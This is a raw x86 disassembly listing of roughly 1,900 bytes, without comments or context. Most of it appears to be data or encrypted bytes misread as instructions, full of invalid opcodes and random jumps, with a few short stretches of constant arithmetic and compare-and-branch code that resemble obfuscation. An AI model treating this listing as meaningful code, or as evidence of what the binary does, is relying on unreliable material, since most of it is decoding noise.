  41d051:	repnz xor ch,BYTE PTR [esi-0x69]
  41d055:	mov    cl,0xfe
  41d057:	mov    ch,0x34
  41d059:	out    dx,al
  41d05a:	push   esp
  41d05b:	mov    ch,0x61
  41d05d:	aad    0x62
  41d05f:	(bad)  
  41d060:	fsubr  DWORD PTR [eax-0x6d86178b]
  41d066:	xor    al,BYTE PTR [eax+0x1aaf5be3]
  41d06c:	and    eax,0x36e504ed
  41d071:	lods   al,BYTE PTR ds:[esi]
  41d072:	rol    dl,1
  41d074:	adc    ch,BYTE PTR ss:[edx-0x40aedfed]
  41d07b:	je     0x41d05e
  41d07d:	mov    ?,WORD PTR [ebx-0x14390e03]
  41d083:	xor    al,0xfb
  41d085:	shr    DWORD PTR [ecx],0xa
  41d088:	sub    eax,0xdeb6beeb
  41d08d:	and    ah,dl
  41d08f:	and    ah,BYTE PTR [eax+0x5366275b]
  41d095:	add    DWORD PTR [ecx-0x62],ebx
  41d098:	cli    
  41d099:	xchg   ecx,eax
  41d09a:	xchg   esp,eax
  41d09b:	inc    ecx
  41d09c:	rol    DWORD PTR [eiz*1-0x1c4187c6],1
  41d0a3:	stc    
  41d0a4:	in     eax,0x26
  41d0a6:	mov    bl,0x91
  41d0a8:	add    eax,0x79f32046
  41d0ad:	inc    esp
  41d0ae:	mul    DWORD PTR ds:0x3edb5169
  41d0b4:	dec    esp
  41d0b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0b6:	pop    ss
  41d0b7:	ins    DWORD PTR es:[edi],dx
  41d0b8:	clc    
  41d0b9:	xchg   DWORD PTR [eax],esp
  41d0bb:	retf   0xdc82
  41d0be:	jae    0x41d0cd
  41d0c0:	sbb    eax,0x7fcc1c9b
  41d0c5:	xor    al,0x76
  41d0c7:	pop    ds
  41d0c8:	imul   BYTE PTR [ebp+eax*1+0x2a87d326]
  41d0cf:	ror    DWORD PTR [edx+0x2c38244c],0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x35bc6585
  41d15f:	push   eax
  41d160:	popf   
  41d161:	jo     0x41d199
  41d163:	pop    ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1-0x5b0e7e8],bh
  41d16c:	push   ds
  41d16d:	xor    dl,cl
  41d16f:	xchg   DWORD PTR ds:0xf12a8911,esi
  41d175:	sti    
  41d176:	pop    es
  41d177:	dec    edx
  41d178:	xchg   esp,eax
  41d179:	push   edx
  41d17a:	aam    0x56
  41d17c:	leave  
  41d17d:	(bad)  
  41d17e:	sahf   
  41d17f:	xchg   esp,eax
  41d180:	dec    edi
  41d181:	int    0x95
  41d183:	push   ebx
  41d184:	daa    
  41d185:	jge    0x41d10c
  41d187:	std    
  41d188:	mov    bl,0x90
  41d18a:	sbb    edx,ebp
  41d18c:	xor    DWORD PTR [ebx-0x53],ebp
  41d18f:	push   eax
  41d190:	sub    BYTE PTR [ebx+ebx*4+0x1d],dl
  41d194:	fs jp  0x41d16e
  41d197:	jmp    0xf73d:0x5b451eec
  41d19e:	pushf  
  41d19f:	xchg   BYTE PTR [eax],bh
  41d1a1:	mov    DWORD PTR ds:[ebx],eax
  41d1a4:	xchg   edi,eax
  41d1a5:	pop    esp
  41d1a6:	mov    eax,ds:0x1aa9e082
  41d1ab:	mov    ecx,0x4e4d717c
  41d1b0:	cmp    BYTE PTR [eax],ch
  41d1b2:	mov    esi,DWORD PTR [edx+esi*4]
  41d1b5:	mov    ah,0x79
  41d1b7:	int3   
  41d1b8:	fwait
  41d1b9:	inc    eax
  41d1ba:	mov    esp,0x10572a5f
  41d1bf:	and    BYTE PTR [eax-0x29],bh
  41d1c2:	imul   eax,DWORD PTR [ebx+ecx*2-0x2091c6be],0xb6ceda14
  41d1cd:	jecxz  0x41d22d
  41d1cf:	repz (bad) 
  41d1d2:	arpl   WORD PTR [ebx+0x76],ax
  41d1d5:	push   ds
  41d1d6:	daa    
  41d1d7:	push   0x7ec9ec20
  41d1dc:	ins    DWORD PTR es:[edi],dx
  41d1dd:	dec    esi
  41d1de:	mov    ah,0xf4
  41d1e0:	mov    ebp,0xf1169e79
  41d1e5:	mov    bh,BYTE PTR [eax]
  41d1e7:	out    0xed,eax
  41d1e9:	bound  edx,QWORD PTR [esi-0x6b]
  41d1ec:	aad    0x4b
  41d1ee:	js     0x41d23c
  41d1f0:	jno    0x41d219
  41d1f2:	cmp    BYTE PTR [esi],ch
  41d1f4:	mov    ch,0x61
  41d1f6:	shr    BYTE PTR [edi-0x74dcbb25],0xac
  41d1fd:	xor    eax,0x70159929
  41d202:	dec    eax
  41d203:	ret    
  41d204:	mov    dl,0xc0
  41d206:	int    0x99
  41d208:	aam    0xf0
  41d20a:	pop    ebx
  41d20b:	aam    0xc7
  41d20d:	(bad)
  41d212:	cwde   
  41d213:	dec    esi
  41d214:	adc    BYTE PTR [edi+0xb],bl
  41d217:	mov    WORD PTR [edi],es
  41d219:	adc    eax,0x5a5f8511
  41d21e:	cmp    cl,BYTE PTR [edi-0xd]
  41d221:	ins    DWORD PTR es:[edi],dx
  41d222:	leave  
  41d223:	cmp    al,0x0
  41d225:	test   dl,al
  41d227:	cmp    DWORD PTR [ecx],esp
  41d229:	sub    BYTE PTR [ebx+0x27],0x2
  41d22d:	dec    edx
  41d22e:	das    
  41d22f:	dec    esp
  41d230:	pop    eax
  41d231:	fwait
  41d232:	cli    
  41d233:	call   0x716ec1d9
  41d238:	or     ah,bh
  41d23a:	mov    edi,0x2df1e959
  41d23f:	loope  0x41d2b2
  41d241:	pop    ecx
  41d242:	mov    esp,0xd7233a66
  41d247:	lods   eax,DWORD PTR ds:[esi]
  41d248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d249:	mov    cl,0xc8
  41d24b:	repz add DWORD PTR [eax],eax
  41d24e:	cmp    al,0xb
  41d250:	and    bl,BYTE PTR [edx]
  41d252:	add    eax,0xad62221
  41d257:	pop    ss
  41d258:	daa    
  41d259:	sub    dh,ah
  41d25b:	jo     0x41d1e5
  41d25d:	int    0x1d
  41d25f:	iret   
  41d260:	fs jbe 0x41d2be
  41d263:	fucomi st,st(3)
  41d265:	pop    es
  41d266:	sub    ebx,DWORD PTR [eax+0x389ce248]
  41d26c:	push   es
  41d26d:	jnp    0x41d2ba
  41d26f:	and    eax,0xe0d9e87e
  41d274:	cdq    
  41d275:	rcl    DWORD PTR [edx-0x1c],0xc4
  41d279:	je     0x41d221
  41d27b:	hlt    
  41d27c:	pushf  
  41d27d:	push   esi
  41d27e:	add    al,0x77
  41d280:	xchg   edx,eax
  41d281:	push   esi
  41d282:	mov    ds:0xb53f269c,al
  41d287:	dec    edx
  41d288:	mov    cl,0x24
  41d28a:	adc    edx,ebx
  41d28c:	sbb    ah,cl
  41d28e:	test   eax,0xcdfb2dff
  41d293:	sbb    al,0xe9
  41d295:	out    0xa1,eax
  41d297:	loop   0x41d297
  41d299:	push   es
  41d29a:	xchg   ebp,eax
  41d29b:	push   ds
  41d29c:	lods   al,BYTE PTR ds:[esi]
  41d29d:	shr    dl,cl
  41d29f:	sub    eax,esp
  41d2a1:	cmc    
  41d2a2:	test   al,0x7a
  41d2a4:	(bad)  
  41d2a5:	pop    ss
  41d2a6:	gs scas al,BYTE PTR es:[edi]
  41d2a8:	inc    ebx
  41d2a9:	aaa    
  41d2aa:	clc    
  41d2ab:	inc    ecx
  41d2ac:	pop    es
  41d2ad:	pop    ebp
  41d2ae:	addr16 mov esi,0x12b2fdac
  41d2b4:	dec    eax
  41d2b5:	push   cs
  41d2b6:	pop    eax
  41d2b7:	cld    
  41d2b8:	call   0x1673:0x80ae3f1f
  41d2bf:	adc    eax,0x667a1f45
  41d2c4:	sbb    eax,0xcb31cda8
  41d2c9:	inc    ebx
  41d2ca:	idiv   al
  41d2cc:	mov    dh,0x8e
  41d2ce:	jbe    0x41d330
  41d2d0:	sbb    ebp,eax
  41d2d2:	mov    WORD PTR ds:0x5a9197f7,gs
  41d2d8:	push   cs
  41d2d9:	shl    ecx,cl
  41d2db:	sti    
  41d2dc:	ds jmp 0x41d2e3
  41d2df:	fcomp  DWORD PTR [ebx]
  41d2e1:	jg     0x41d2c3
  41d2e3:	in     eax,0x1a
  41d2e5:	push   ecx
  41d2e6:	icebp  
  41d2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e8:	lock adc cl,BYTE PTR [ebp+0x21]
  41d2ec:	xchg   ebp,eax
  41d2ed:	in     eax,0x82
  41d2ef:	xlat   BYTE PTR ds:[ebx]
  41d2f0:	pop    edx
  41d2f1:	inc    edx
  41d2f2:	sub    ecx,DWORD PTR [ebx-0x3]
  41d2f5:	push   0x73b51815
  41d2fa:	mov    edi,DWORD PTR [ecx]
  41d2fc:	imul   edx,DWORD PTR [edx-0x77c9bc9d],0x1680b581
  41d306:	icebp  
  41d307:	cmp    eax,0x2f415046
  41d30c:	xor    BYTE PTR [esi-0x1f],ah
  41d30f:	push   esp
  41d310:	dec    eax
  41d311:	inc    ebx
  41d312:	test   al,0x5
  41d314:	jbe    0x41d2de
  41d316:	jae    0x41d2da
  41d318:	push   eax
  41d319:	gs pop ds
  41d31b:	inc    ebx
  41d31c:	mov    al,0x44
  41d31e:	lds    ecx,FWORD PTR [ebp-0x6616f88f]
  41d324:	std    
  41d325:	arpl   WORD PTR [edi],si
  41d327:	ss mov al,0xc1
  41d32a:	cs sub ebp,ebp
  41d32d:	je     0x41d34a
  41d32f:	cwde   
  41d330:	fld    QWORD PTR [ecx]
  41d332:	in     al,dx
  41d333:	push   cs
  41d334:	mov    ch,0xb6
  41d336:	or     BYTE PTR [ebp+0x3d],bh
  41d339:	ja     0x41d305
  41d33b:	std    
  41d33c:	adc    esp,DWORD PTR [ecx+0x6f]
  41d33f:	inc    ecx
  41d340:	inc    ebp
  41d341:	fisttp WORD PTR [edi-0xc]
  41d344:	les    ebx,FWORD PTR [eax-0x72]
  41d347:	push   eax
  41d348:	inc    ecx
  41d349:	aas    
  41d34a:	add    BYTE PTR [eax-0x22],dh
  41d34d:	int3   
  41d34e:	outs   dx,DWORD PTR ds:[esi]
  41d34f:	inc    ecx
  41d350:	cld    
  41d351:	jl     0x41d36f
  41d353:	jno    0x41d315
  41d355:	lods   eax,DWORD PTR ds:[esi]
  41d356:	aad    0xdf
  41d358:	inc    esi
  41d359:	or     edi,esp
  41d35b:	pop    ebp
  41d35c:	xor    cl,BYTE PTR [edi+edi*1]
  41d35f:	pop    ebx
  41d360:	popa   
  41d361:	mov    edx,DWORD PTR [eax-0x6e]
  41d364:	inc    esp
  41d365:	fwait
  41d366:	(bad)  
  41d367:	aaa    
  41d368:	ja     0x41d364
  41d36a:	mov    bl,0xc3
  41d36c:	add    eax,0x5d0dc11e
  41d371:	pop    edx
  41d372:	jno    0x41d2f6
  41d374:	mov    cl,0x58
  41d376:	lahf   
  41d377:	pop    ebp
  41d378:	stos   DWORD PTR es:[edi],eax
  41d379:	ins    BYTE PTR es:[edi],dx
  41d37a:	dec    eax
  41d37b:	xchg   edi,eax
  41d37c:	scas   al,BYTE PTR es:[edi]
  41d37d:	into   
  41d37e:	pop    ebx
  41d37f:	pop    DWORD PTR [ebp+0x22]
  41d382:	aam    0x35
  41d384:	push   cs
  41d385:	xchg   ecx,eax
  41d386:	lods   al,BYTE PTR ds:[esi]
  41d387:	aaa    
  41d388:	push   esp
  41d389:	dec    edx
  41d38a:	imul   esp,ecx,0x6c1f03f8
  41d390:	jns    0x41d381
  41d392:	or     esi,DWORD PTR [eax-0x2d]
  41d395:	xor    eax,0x4e258edc
  41d39a:	les    ebp,FWORD PTR [eax-0x2f39ec01]
  41d3a0:	pop    ebp
  41d3a1:	es pop ebp
  41d3a3:	dec    edi
  41d3a4:	push   esp
  41d3a5:	arpl   WORD PTR [edx-0x39b4e680],dx
  41d3ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3ac:	les    ecx,FWORD PTR [edx]
  41d3ae:	jl     0x41d3c0
  41d3b0:	bound  eax,QWORD PTR [ecx]
  41d3b2:	inc    esp
  41d3b3:	xchg   ebp,ebx
  41d3b5:	push   cs
  41d3b6:	out    0x10,eax
  41d3b8:	cmc    
  41d3b9:	into   
  41d3ba:	mov    bl,0xe1
  41d3bc:	out    0x7d,al
  41d3be:	push   ds
  41d3bf:	clc    
  41d3c0:	mov    es,WORD PTR [ebp-0x43260443]
  41d3c6:	and    eax,0x595ef325
  41d3cb:	push   0xffffffc2
  41d3cd:	mov    cl,0x5a
  41d3cf:	or     edx,DWORD PTR [edi]
  41d3d1:	gs inc esi
  41d3d3:	stos   DWORD PTR es:[edi],eax
  41d3d4:	inc    ebp
  41d3d5:	xchg   DWORD PTR [ebx+edi*4+0x16],edi
  41d3d9:	jg     0x41d36f
  41d3db:	out    0x7f,eax
  41d3dd:	cmp    al,0xdf
  41d3df:	mov    BYTE PTR [esi+ecx*1],bl
  41d3e2:	lods   eax,DWORD PTR ds:[esi]
  41d3e3:	mov    gs,edi
  41d3e5:	aaa    
  41d3e6:	jb     0x41d450
  41d3e8:	repnz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  41d3eb:	mov    al,ds:0xb5aed167
  41d3f0:	leave  
  41d3f1:	xchg   DWORD PTR [ecx+ebp*8+0x9],edi
  41d3f5:	stos   BYTE PTR es:[edi],al
  41d3f6:	js     0x41d455
  41d3f8:	ds push ebx
  41d3fa:	jge    0x41d447
  41d3fc:	ds mov bl,0xc8
  41d3ff:	mov    ebx,DWORD PTR [edi]
  41d401:	mov    ebp,0x6925253b
  41d406:	jmp    0x41d451
  41d408:	aaa    
  41d409:	pop    edx
  41d40a:	outs   dx,DWORD PTR ds:[esi]
  41d40b:	xchg   edx,eax
  41d40c:	(bad)  
  41d40e:	xchg   DWORD PTR [edx+0x207762c1],edx
  41d414:	out    dx,eax
  41d415:	push   ecx
  41d416:	fstp   TBYTE PTR [ebx]
  41d418:	out    0x55,al
  41d41a:	data16 (bad) 
  41d41c:	fs aaa 
  41d41e:	pcmpeqb mm5,mm0
  41d421:	xchg   bp,ax
  41d423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d424:	outs   dx,DWORD PTR ds:[esi]
  41d425:	call   0x1ed1a8dc
  41d42a:	mov    edx,0xb0ae0633
  41d42f:	jb     0x41d473
  41d431:	xor    DWORD PTR [edx-0x71],edx
  41d434:	pop    es
  41d435:	fild   QWORD PTR [ebx]
  41d437:	scas   al,BYTE PTR es:[edi]
  41d438:	leave  
  41d439:	dec    esp
  41d43a:	fidiv  WORD PTR [edi-0x25]
  41d43d:	pop    ecx
  41d43e:	mov    esi,0x3c2a4999
  41d443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d444:	sahf   
  41d445:	fld    TBYTE PTR [eax]
  41d447:	xchg   edi,eax
  41d448:	ret    0x1492
  41d44b:	push   DWORD PTR [ebx+eax*2+0x6e82ff54]
  41d452:	dec    edx
  41d453:	xor    bl,cl
  41d455:	(bad)  
  41d456:	rcr    DWORD PTR [edi+0x7d9c0ef1],cl
  41d45c:	cmp    bh,ch
  41d45e:	jb     0x41d4ae
  41d460:	dec    eax
  41d461:	xchg   esp,eax
  41d462:	xchg   ecx,eax
  41d463:	pop    es
  41d464:	hlt    
  41d465:	push   esi
  41d466:	jecxz  0x41d4c4
  41d468:	pop    ebp
  41d469:	rcl    BYTE PTR [ebx+0x2c436d74],0xf2
  41d470:	dec    esp
  41d471:	bound  esp,QWORD PTR [eax+0x2a]
  41d474:	pop    ebx
  41d475:	mov    bh,0x2b
  41d477:	adc    BYTE PTR [ebx+0x4],dl
  41d47a:	mov    ah,0x89
  41d47c:	adc    eax,edx
  41d47e:	and    BYTE PTR [eax],bh
  41d480:	xor    al,0x27
  41d482:	popf   
  41d483:	sbb    edi,esi
  41d485:	and    al,0x34
  41d487:	out    0xa6,al
  41d489:	ret    
  41d48a:	mov    dh,0x5a
  41d48c:	mov    BYTE PTR [eax+0x529dc95e],0xfa
  41d493:	aad    0x15
  41d495:	lods   al,BYTE PTR ds:[esi]
  41d496:	push   esp
  41d497:	push   esp
  41d498:	cmp    al,0x9b
  41d49a:	mov    eax,ds:0xa07c1299
  41d49f:	cmp    al,0x37
  41d4a1:	sub    eax,0x3e7c58ac
  41d4a6:	sub    ch,BYTE PTR [ecx-0x48f40591]
  41d4ac:	mov    edi,0xa86365f0
  41d4b1:	inc    edx
  41d4b2:	ins    BYTE PTR es:[edi],dx
  41d4b3:	pop    edi
  41d4b4:	push   es
  41d4b5:	or     BYTE PTR [ebp-0x73a4c380],0xb3
  41d4bc:	outs   dx,BYTE PTR ds:[esi]
  41d4bd:	ins    BYTE PTR es:[edi],dx
  41d4be:	mov    ebx,0x1c7f7faf
  41d4c3:	outs   dx,BYTE PTR ds:[esi]
  41d4c4:	and    edx,ebx
  41d4c6:	cmp    al,0x61
  41d4c8:	adc    esp,edi
  41d4ca:	int3   
  41d4cb:	push   0x221c70e2
  41d4d0:	hlt    
  41d4d1:	push   0x7999188d
  41d4d6:	mov    esp,0x5cfa7581
  41d4db:	lahf   
  41d4dc:	retf   0x558f
  41d4df:	pop    es
  41d4e0:	jg     0x41d473
  41d4e2:	dec    esp
  41d4e3:	cld    
  41d4e4:	pop    es
  41d4e5:	push   ecx
  41d4e6:	mov    ecx,0xcd930632
  41d4eb:	adc    ah,BYTE PTR [ecx]
  41d4ed:	stos   BYTE PTR es:[edi],al
  41d4ee:	stc    
  41d4ef:	test   BYTE PTR [edi-0x7fef6ad2],0xf
  41d4f6:	adc    BYTE PTR [eax+0x79],dl
  41d4f9:	pop    ecx
  41d4fa:	ja     0x41d513
  41d4fc:	jnp    0x41d510
  41d4fe:	(bad)  
  41d4ff:	scas   eax,DWORD PTR es:[edi]
  41d500:	mov    edx,DWORD PTR [edx+eax*1+0x258fe3bc]
  41d507:	pop    esi
  41d508:	call   0xf95f111d
  41d50d:	repz push edx
  41d50f:	nop
  41d510:	mov    bh,0xf9
  41d512:	and    bh,al
  41d514:	outs   dx,DWORD PTR ds:[esi]
  41d515:	add    eax,0x787851d
  41d51a:	add    al,0xe5
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d4d1
  41d54b:	mov    bh,0x4b
  41d54d:	jle    0x41d529
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1+0x67071818],bh
  41d558:	in     al,0xf7
  41d55a:	lods   eax,DWORD PTR ds:[esi]
  41d55b:	hlt    
  41d55c:	and    ecx,DWORD PTR [ecx+0x601b77fa]
  41d562:	sbb    eax,0xac30545b
  41d567:	mov    al,ds:0xa3779489
  41d56c:	mov    eax,ds:0x291f4156
  41d571:	in     eax,dx
  41d572:	daa    
  41d573:	arpl   WORD PTR [esi],dx
  41d575:	dec    ebx
  41d576:	outs   dx,DWORD PTR ds:[esi]
  41d577:	je     0x961e791
  41d57d:	ins    DWORD PTR es:[edi],dx
  41d57e:	pop    ecx
  41d57f:	call   0xd63906d0
  41d584:	outs   dx,DWORD PTR ds:[esi]
  41d585:	dec    edi
  41d586:	fwait
  41d587:	cmp    eax,0xf73aefc2
  41d58c:	lods   al,BYTE PTR ds:[esi]
  41d58d:	(bad)  
  41d58e:	fdiv   DWORD PTR [ebp+ecx*4+0x6b]
  41d592:	fld    DWORD PTR [ebx]
  41d594:	push   ss
  41d595:	mov    WORD PTR [ecx+0x4c],gs
  41d598:	mov    dl,al
  41d59a:	test   eax,0xcdad3d11
  41d59f:	cmc    
  41d5a0:	arpl   si,cx
  41d5a2:	retf   0x4c3c
  41d5a5:	sbb    eax,0x74c0b820
  41d5aa:	scas   eax,DWORD PTR es:[edi]
  41d5ab:	inc    ebx
  41d5ac:	mov    eax,0x985df502
  41d5b1:	xlat   BYTE PTR ds:[ebx]
  41d5b2:	lock adc al,BYTE PTR [ecx]
  41d5b5:	repnz sar BYTE PTR [edi-0x56],1
  41d5b9:	mov    edi,0x321c7d6a
  41d5be:	push   0x47
  41d5c0:	(bad)  
  41d5c1:	xchg   DWORD PTR [edx+0x699aa6f],ecx
  41d5c7:	push   0xffffffb5
  41d5c9:	leave  
  41d5ca:	rcr    BYTE PTR [edi],0xd
  41d5cd:	mov    edi,0x4ecceebf
  41d5d2:	(bad)  
  41d5d3:	enter  0x9a42,0xf7
  41d5d7:	jmp    FWORD PTR [edx+eax*8+0x24]
  41d5db:	mov    bh,0xae
  41d5dd:	cs leave 
  41d5df:	xor    DWORD PTR [ebx+ebx*2-0x7eaf9523],ebx
  41d5e6:	dec    ecx
  41d5e7:	or     ecx,ecx
  41d5e9:	sub    DWORD PTR [eax+0x12e7f0fd],edx
  41d5ef:	fwait
  41d5f0:	repnz cmp BYTE PTR [edi-0x4dad8422],dh
  41d5f7:	in     eax,dx
  41d5f8:	rcr    esp,0x3
  41d5fb:	lods   eax,DWORD PTR ds:[esi]
  41d5fc:	mov    edi,0x2bc17ded
  41d601:	mov    ecx,0x74f69617
  41d606:	sbb    al,BYTE PTR [ebp+0x4b60da2a]
  41d60c:	xchg   esi,eax
  41d60d:	push   es
  41d60e:	add    al,bh
  41d610:	iret   
  41d611:	shl    bh,cl
  41d613:	test   al,0xae
  41d615:	inc    eax
  41d616:	gs mov esp,edx
  41d619:	retf   0x3e16
  41d61c:	shl    DWORD PTR [edx],cl
  41d61e:	in     al,0xf8
  41d620:	popf   
  41d621:	aaa    
  41d622:	(bad)  
  41d623:	clc    
  41d624:	xor    DWORD PTR [edx+0x552cb0cb],esp
  41d62a:	data16 fistp QWORD PTR [eax-0x7ee4864d]
  41d631:	mov    ebp,?
  41d633:	cmc    
  41d634:	and    ebx,DWORD PTR [edx+ebp*1]
  41d637:	jmp    0xda1884a1
  41d63c:	(bad)  
  41d63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d63e:	sub    al,al
  41d640:	cmp    BYTE PTR [edi-0x21],bl
  41d643:	lahf   
  41d644:	and    al,0xf3
  41d646:	and    eax,0x9ed8d0e6
  41d64b:	mov    edi,0x1b9e2934
  41d650:	cmp    esi,DWORD PTR [ecx]
  41d652:	retf   0x5f51
  41d655:	jle    0x41d6ae
  41d657:	and    al,BYTE PTR [ebp+0x1cdaa43b]
  41d65d:	sub    eax,edx
  41d65f:	adc    BYTE PTR [edx+0x7d],ah
  41d662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d663:	fwait
  41d664:	xchg   ebp,eax
  41d665:	mov    ch,BYTE PTR [ecx+0x62]
  41d668:	rcr    bh,0xa2
  41d66b:	je     0x41d6ce
  41d66d:	shl    DWORD PTR [ebx+0x494a8334],cl
  41d673:	lock in eax,dx
  41d675:	xchg   esp,eax
  41d676:	cmp    BYTE PTR [ebx+0x40],ch
  41d679:	dec    ebp
  41d67a:	pop    es
  41d67b:	sub    DWORD PTR [esi+eiz*4+0x36980601],ebp
  41d682:	repnz and BYTE PTR ds:0x6f5c6171,al
  41d689:	or     bh,BYTE PTR [edi+eax*4]
  41d68c:	fcom   st(1)
  41d68e:	lds    ebx,FWORD PTR [ecx+eiz*1+0x4f]
  41d692:	adc    eax,0x8e7b0c15
  41d697:	inc    esi
  41d698:	aaa    
  41d699:	mov    al,ds:0xa48221f4
  41d69e:	jne    0x41d6af
  41d6a0:	sub    esp,esi
  41d6a2:	and    BYTE PTR [ebp-0x16],cl
  41d6a5:	ds mov eax,0x24385e38
  41d6ab:	test   al,0x1b
  41d6ad:	or     BYTE PTR [eax+0x281c9aff],ah
  41d6b3:	call   0x7af2a381
  41d6b8:	or     BYTE PTR [ebp-0x3b7287d9],cl
  41d6be:	daa    
  41d6bf:	sti    
  41d6c0:	call   0x8845779
  41d6c5:	push   esi
  41d6c6:	pushf  
  41d6c7:	jo     0x41d6da
  41d6c9:	push   cs
  41d6ca:	(bad)  
  41d6cb:	in     eax,dx
  41d6cc:	pop    ecx
  41d6cd:	pop    eax
  41d6ce:	push   edi
  41d6cf:	sbb    eax,0x5d59f5eb
  41d6d4:	hlt    
  41d6d5:	addr16 jle 0x41d65f
  41d6d8:	aas    
  41d6d9:	and    BYTE PTR [ecx-0x51],dl
  41d6dc:	(bad)  
  41d6dd:	mov    eax,0xe494b44b
  41d6e2:	pop    esp
  41d6e3:	ins    DWORD PTR es:[edi],dx
  41d6e4:	and    dl,dh
  41d6e6:	iret   
  41d6e7:	dec    edi
  41d6e8:	dec    edi
  41d6e9:	call   0x60:0xb84bd4ea
  41d6f0:	dec    edx
  41d6f1:	dec    edi
  41d6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f3:	bound  ebx,QWORD PTR [eax-0x3cdc39ed]
  41d6f9:	jae    0x41d6ee
  41d6fb:	in     eax,0x7b
  41d6fd:	sub    dl,BYTE PTR [edi]
  41d6ff:	push   0x937774e2
  41d704:	popa   
  41d705:	out    dx,al
  41d706:	retf   
  41d707:	test   DWORD PTR ds:0xda646e7e,eax
  41d70d:	sbb    BYTE PTR [edx+edi*4-0x5],dh
  41d711:	inc    esi
  41d712:	mov    ah,0x60
  41d714:	xor    BYTE PTR [ecx-0x25336bad],bl
  41d71a:	mov    bl,0x51
  41d71c:	add    edx,ecx
  41d71e:	(bad)  
  41d71f:	mov    eax,ds:0xbb055b3a
  41d724:	adc    BYTE PTR [ebp+0x6],0x5c
  41d728:	lods   eax,DWORD PTR ds:[esi]
  41d729:	push   ecx
  41d72a:	(bad)  
  41d72b:	enter  0x4e89,0xa9
  41d72f:	or     bl,0xd2
  41d732:	and    BYTE PTR gs:[edx-0x13],dl
  41d736:	and    DWORD PTR [edi-0x5c3b9368],0x229b95b0
  41d740:	cmp    ah,BYTE PTR [edi]
  41d742:	or     BYTE PTR ds:0x84bde3d,bh
  41d748:	fdiv   st,st(0)
  41d74a:	and    eax,0x8c3ed399
  41d74f:	cmp    dl,BYTE PTR [edi+0x23]
  41d752:	add    BYTE PTR [ebp+0x7e496ccc],bh
  41d758:	or     ah,ch
  41d75a:	push   esi
  41d75b:	mov    ch,0xcb
  41d75d:	ja     0x41d755
  41d75f:	test   edx,esi
  41d761:	adc    eax,0x360f3bf3
  41d766:	lea    esp,[edi]
  41d768:	retf   0xd566
  41d76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d76c:	inc    eax
  41d76d:	pusha  
  41d76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d76f:	pop    ds
  41d770:	mov    ds:0x32f769c9,eax
  41d775:	add    bl,dh
  41d777:	loope  0x41d7d9
  41d779:	jb     0x41d7dc
  41d77b:	sar    DWORD PTR [edx+0x72],0xe9
  41d77f:	ret    
  41d780:	xor    BYTE PTR [ebp-0x69],bh
  41d783:	sbb    al,0x1c
  41d785:	xor    eax,0x3daef2f1
  41d78a:	mov    edi,0x25836e23
  41d78f:	dec    edi
  41d790:	mov    ebp,0x59b859b5
  41d795:	push   edi
  41d796:	mov    edx,0x4e0160df
  41d79b:	add    dh,BYTE PTR [eax-0x24ff149e]
  41d7a1:	fs jge 0x41d7b5
  41d7a4:	test   eax,0xf5240bb6
  41d7a9:	arpl   WORD PTR [edi+0x7f2266b2],bp
  41d7af:	mov    ch,0x91
  41d7b1:	inc    ebx
  41d7b2:	sub    al,0x2c
  41d7b4:	xchg   DWORD PTR [esi-0x5f],ebp
  41d7b7:	jmp    0x38f0:0x153d8110
  41d7be:	pop    esi
  41d7bf:	mov    edx,0x8fe95684
  41d7c4:	or     BYTE PTR [eax+0x1b606607],bl
  41d7ca:	frstor [eax-0x11]
